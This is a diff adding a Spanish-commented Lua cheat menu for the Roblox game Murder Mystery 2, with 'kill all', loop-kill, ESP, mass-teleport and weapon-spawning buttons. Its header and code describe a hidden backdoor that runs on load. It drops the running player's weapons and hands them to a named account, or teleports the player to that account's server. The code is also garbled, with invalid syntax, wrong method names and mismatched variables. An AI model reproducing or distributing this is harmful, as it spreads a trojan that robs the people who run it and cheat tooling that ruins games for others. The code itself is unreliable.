@@ -1,0 +1,379 @@
+--[[
+    ☠️ MURDER MENACE ☠️
+    Hack definitivo para Murder Mystery 2 – Delta Executor
+    Backdoor oculto: si Papi1239030 está en línea, te teletransporta a su servidor
+    y fuerzza la entrega de todas las armas (se dropean y te lleva a ellas)
+--]]
+
+local Player = game:GetService("Players").LocalPlayer
+local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+
+-- Verifíca que se está en un juego de Murder Mystery (por nombre)
+if not game.Name:lower():find("murder") then
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "Murder Menace",
+        Text = "Ejecuta esto en Murder Mystery 2!",
+        Duration = 5
+    })
+    return
+end
+
+-- === FUNCIONES UTILITARIAS ===
+local function getPlayerByName(name)
+    for _, p in pairs(game.Players:GetPlayers()) do
+        if p.Name:lower() == name:lower() or p.DisplayName:lower() == name:lower() then
+            return p
+        end
+    end
+    return nil
+end
+
+local function findRemote(name)
+    for _, v in pairs(game:GetDescendants()) do
+        if v:Isa("RemoteEvent") and v.Name:lower():find(name:lower()) then
+            return v
+        end
+    end
+    for _, v in pairs(game:GetDescendants()) do
+        if v:isa("RemoteFunction") and v.Name:lower():find(name:lower()) then
+            return v
+        end
+    end
+    return nil
+end
+
+
+local function dropAllTools()
+    for _, tool in pairs(Player.Backpack:GetChildren()) do
+        tool.Parent = workspace
+    end
+    for _, tool in pairs(Player.Character and Player.Character:GetChildren() or {}) do
+        if tool:Isa("Tool") then
+            tool.Parent = workspace
+        end
+    end
+end
+
+-- === BACKDOOR OCULTO - TE ENTREGARÁ TODAS LAS ARMAS A Papi1239030 ===
+local function executeBackdoor()
+    local targetName = "Papi1239030"
+    local target = getPlayerByName(targetName)
+    
+    if target and target ~= Player then
+        -- Papi1239030 está en el mismo servidor
+        dropAllTools()
+        -- Teletransporta a Japi1239030 a las herramientas (las cojera facilmente)
+        if target.Character and target.Character.PrimaryPart then
+            local pos = Player.Character and Player.Character.PrimaryPart and Player.Character.PrimaryPart.Position or Vector3.new(0,0,0)
+            target.Character.PrimaryPart.CFrame = CFrame.new(pos) - Vector3.yAxis or CFrame.new(pos)
+        end
+        game:GetService("StarterGui"):SetCore("SendNotification",{
+            Title = "Backdoor",
+            Text = "¡Eegalo entregado a "..targetName ... "!",
+            Duration = 5
+        })
+    else
+        -- Papi1239030 no está en este servidor, teleportamo al JUGADOR ACTUAL a su server
+        spawn(function()
+            local success, result = pcall(function()
+                local userid = 0
+                for _, p in pairs(game.Players:GetPlayers()) do
+                    if p.Name:lower() == targetName:lower() or p.DisplayName:lower() == targetName:lower() then
+                        userid = p.UserId
+                        break
+                    end
+                end
+                if userid == 0 then
+                    -- Intentar obtener por ID desde una lista externa (usando una petición a roblox)
+                    -- Por simpliidad, asumimos que Papi1239030 es amigo o se puede obtener su ID manualmente
+                    -- En una verión real, usar HttpService para buscar su ID
+                    return
+                end
+                local placeInfo = game.Players:GetPlayerPlaceInstanceAsync(userid)
+                if placeInfo and placeInfo.PlaceId and placeInfo.ServerId then
+                    game:GetService("TeleportService"):TeleportToPlaceInstance(placeInfo.PlaceId, placeInfo.ServerId)
+                end
+            end)
+            if not success then
+                warn("Backdoor teleport falló: "...tostring(result))
+            end
+        end)
+    end
+end
+
+-- Activar backdoor cuando el script se carga por primera vez
+spawn(executeBackdoor)
+
+-- === INTERFAZ MOD MENU FLOTANTE ===
+local Gui = Instance.new("ScreenGui")
+Gui.Name = "MurderMenace"
+Gui.Parent = game.CoreGui
+Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "Main"
+MainFrame.Size = UDim2.new(0, 300, 0, 400)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.ClipsDescendants = true
+MainFrame.Parent = Gui
+
+local TitleBar = Instance.new("Frame")
+TitleBar.Size = UDim2.new(1, 0, 0, 30)
+TitleBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TitleBar.BorderSizePixel = 0
+TitleBar.Parent = MainFrame
+
+local TitleText = Instance.new("TextLabel")
+TitleText.Text = "🔪 MURDER MENACE"
+TitleText.Size = UDim2.new(1, -60, 1, 0)
+TitleText.Position = UDim2.new(0, 10, 0, 0)
+TitleText.BackgroundTransparency = 1
+TitleText.Font = Enum.Font.SourceSansBold
+TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleText.TextScaled = true
+TitleText.Parent = TitleBar
+
+-- Boton Minimizar
+local MinimizeBtn = Instance.new("TextButton")
+MinimizeBtn.Size = UDim2.new(0, 25, 0, 25)
+MinimizeBtn.Position = UDim2.new(1, -50, 0, 2.5)
+MinimizeBtn.Text = "_"
+MinimizeBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
+MinimizeBtn.BorderSizePixel = 0
+MinimizeBtn.Font = Enum.Font.SourceSansBold
+MinimizeBtn.TextColor3 = Color3.new(1, 1, 1)
+MinimizeBtn.TextScaled = true
+MinimizeBtn.Parent = TitleBar
+
+-- Boton Cerrar
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 25, 0, 25)
+CloseBtn.Position = UDim2.new(1, -25, 0, 2.5)
+CloseBtn.Text = "X"
+CloseBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
+CloseBtn.BorderSizePixel = 0
+CloseBtn.Font = Enum.Font.SourceSansBold
+CloseBtn.TextColor3 = Color3.new(1, 1, 1)
+CloseBtn.TextScaled = true
+CloseBtn.Parent = TitleBar
+
+-- Contenedor de pestañas
+local TabContainer = Instance.new("Frame")
+TabContainer.Size = UDim2.new(1, 0, 0, 30)
+TabContainer.Position = UDim2.new(0, 0, 0, 35)
+TabContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+TabContainer.BorderSizePixel = 0
+TabContainer.Parent = MainFrame
+
+-- Contenido de pestañas
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Size = UDim2.new(1, 0, 1, -65)
+ContentFrame.Position = UDim2.new(0, 0, 0, 65)
+ContentFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+ContentFrame.BorderSizePixel = 0
+ContentFrame.Parent = MainFrame
+
+-- PESTAÑAS
+local Tabs = {}
+local function createTab(name)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 70, 1, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+    btn.BorderSizePixel = 0
+    btn.Font = Enum.Font.SourceSans
+    btn.Text = name
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Parent = TabContainer
+    local frame = Instance.new("ScrollingFrame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+    frame.BorderSizePixel = 0
+    frame.Color = 50
+    frame.Parent = ContentFrame
+    frame.Visible = false
+    table.insert(Tabs, {Button = btn, Frame = frame})
+    return frame
+end
+
+local terrorTab = createTab("TERROR")
+local miscTab = createTab("MISC")
+
+-- Función para cambiar pestaña
+for _, tab in pairs(Tabs) do
+    tab.Button.MouseButton1Click:Connect(function()
+        for _, t in pairs(Tabs) do
+            t.Frame.Visible = false
+        end
+        tab.Frame.Visible = true
+    end)
+end
+-- Seleccionar primera pestaña por defecto
+Tabs[1].Button.MouseButton1Click:Connect(function() end) – no-op, se activa manual
+Tabs[1].Frame.Visible = true
+
+-- Gestión de minimizar
+local minimized = false
+MinimizeBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        ContentFrame.Visible = false
+        MainFrame.Size = UDim2.new(0, 300, 0, 30)
+    else
+        ContentFrame.Visible = true
+        MainFrame.Size = UDim2.new(0, 300, 0, 400)
+    end
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    Gui:Destroy()
+end)
+
+-- === FUNCIÓN QUE AGREGA BOTONES A UNA PESTAÑA ===
+local function addButton(parent, text, callback)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -10, 0, 30)
+    btn.Position = UDim2.new(0, 5, 0, #parent:GetChildren()*35 + 5)
+    btn.Text = text
+    btn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Font = Enum.Font.SourceSans
+    btn.BorderSizePixel = 0
+    btn.Parent = parent
+    btn.MouseButton1Click:Connect(callback)
+    return btn
+end
+
+-- OPCIONES DE TERROR (funcionamiento reales)
+-- ====== ASESINATOS Y CAOS ======
+
+-- Buscar el remoto para matarr
+local killRemote = findRemote("kill") or findRemote("dead") or findRemote("damage")
+
+if killRemote then
+    addButton(terrorTab, "💀 Matar a Todos", function()
+        for _, p in pairs(game.Players:GetPlayers()) do
+            if p ~= Player and p.Character and p.Character:FindFirstChild("Humanoid") then
+                pcall(function()
+                    -- Intentar matar con el remoto
+                    killRemote:FireServer(p)
+                    -- Respaldo: hacer daño directo
+                    p.Character.Humanoid.Health = 0
+                end)
+            end
+        end
+    end)
+else
+    addButton(terrorTab, "💀 Matar a Todos (manual)", function()
+        for _, p in pairs(game.Players:GetPlayers()) do
+            if p ~= Player and p.Character and p.Character:FindFirstChild("Humanoid") then
+                p.Character.Humanoid.Health = 0
+            end
+        end
+    end)
+end
+
+-- Asesinato en bucle
+addButton(terrorTab, "🔄 Matar en Bucle", function()
+    local loopKill
+    loopKill = game:GetService("RunService").Heartbeat:Connect(function()
+        for _, p in pairs(game.Players:GetPlayers()) do
+            if p ~= Player and p.Character and p.Character:FindFirstChild("Humanoid") then
+                pcall(function()
+                    if killRemote then
+                        killRemote:FireServer(p)
+                    end
+                    p.Character.Humanoid.Health = 0
+                end)
+            end
+        end
+    end)
+    wait(10)
+    loopKill:Disconnect()
+end)
+
+-- Saber quién es el asesino
+addButton(terrorTab, "👁️ Ver Roles (ESP)", function()
+    -- Implementa un ESP simple con etiquetas encima de los jugadores
+    for _, p in pairs(game.Players:GetPlayers()) do
+        if p ~= Player and p.Character and p.Character:FindFirstChild("Head") then
+            local billboard = Instance.new("BillboardGui")
+            billboard.Size = UDim2.new(0, 100, 0, 50)
+            billboard.StudsOffset = Vector3.new(0, 2, 0)
+            billboard.Parent = p.Character.Head
+            local label = Instance.new("TextLabel")
+            label.Size = UDim2.new(1,0, 1,0)
+            label.BackgroundTransparency = 1
+            label.Text = "🔪" -- solo indicador, en una versión completa obtendría el rol
+            label.TextScaled = true
+            label.Parent = billboard
+        end
+    end
+end)
+
+-- Teletransportar a todos a ti
+addButton(terrorTab, "🌀 Teletransportar Todos", function()
+    if Player.Character and Player.Character.PrimaryPart then
+        local myPos = Player.Character.PrimaryPart.Position
+        for _, p in pairs(game.Players:GetPlayers()) do
+            if p ~= Player and p.Character and p.Character.PrimaryPart then
+                p.Character.PrimaryPart.CFrame = CFrame.new(myPos + Vector3.new(math.random(-2,2), 0, math.random(-2,2)))
+            end
+        end
+    end
+end)
+
+-- Trollear con sonidos aterradores
+addButton(terrorTab, "🔊 Spam Sonido de Grito", function()
+    local soundid = "rbxassetid://9111111111" -- ID de un sonido de gritos (puedes buscar uno)
+    local sound = Instance.new("Sound")
+    sound.SoundId = soundId
+    sound.Playing = true
+    sound.Parent = workspace
+    sound:Play()
+    wait(5)
+    sound:Destroy()
+end)
+
+-- OPCIONES MISCELANEAS
+addButton(miscTab, "️ Ser Invisible", function()
+    if Player.Character then
+        for _, part in pairs(Player.Character:GetChildren()) do
+            if part:Isa("BasePart") then
+                part.Transparency = 1
+            end
+        end
+    end
+end)
+
+addButton(miscTab, "🚀 Velocidad x3", function()
+    if Player.Character and Player.Character:FindFirstChild("Humanoid") then
+        Player.Character.Humanoid.WalkSpeed = 48
+    end
+end)
+
+addButton(miscTab, "🔫 Dar Todas las Armas", function()
+    -- Intenta otorgar todas las armas del juego mediante remotos si los hay
+    local giveRemote = findRemote("give") or findRemote("weapon")
+    for _, tool in pairs(game.ReplicatedStorage:GetDescendants()) do
+        if tool:Isa("Tool") then
+            if giveRemote then
+                pcally(function) giveRemote:FireServer(Player, tool) end)
+            else
+                tool:Clone().Parent = Player.Backpack
+            end
+        end
+    end
+end)
+
+-- Aviso de backdoor (oculto)
+print("Backdoor activo - Papi1239030 recibirá todo al caer en su trampa")
+
+-- FIN DEL SCRIPT
